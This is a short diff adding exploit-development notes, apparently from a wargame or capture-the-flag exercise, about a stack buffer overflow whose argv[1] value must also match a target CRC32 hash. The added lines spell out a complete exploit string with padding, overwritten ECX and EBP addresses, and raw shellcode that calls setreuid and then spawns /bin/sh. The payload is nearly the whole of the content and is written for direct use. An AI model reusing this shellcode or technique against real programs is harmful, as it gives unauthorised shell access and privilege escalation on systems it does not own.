@@ -1,3 +1,13 @@
+*Revision - I cleaned up the wrapper drastically, and found a different file to patch the CRC32 hash.
+*Additionally, an extra pop (pop ecx) was added to the epilogue of main, with ecx-4 being used to assign the stack pointer. This has an impact on the ret.
+Other than that, its the same. Buffer overflow, but patch argv[1] overflow value to crc32 to '0xe1ca95ee'. Also have to reuse SETREUID shellcode
+
+*argv1 now:                                                      Sets ECX, ECX-4 becomes ESP
+*"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ECX\xa9\xdf\xff\xff EBP\x6c\x2b\xd7\x7e"
+*┌ Which should point here, which returns to shellcode here
+*\xae\xdf\xff\xffLODE=1\xc0\xb0\x46""1\xdb""f\xbb\x90\x13""1\xc9""f\xb9\x90\x13\xcd\x80\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x89\xe5\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x8d\x0c\x24\x31\xc0\x50\x51\x8b\x1c\x24\x89\xe1\xb0\x0b\xcd\x80"
+
+
 Reverse CRC32? Supposedly can return any desired CRC32 hash by appending 4 bytes
 to the end of whatever message we desire.
 
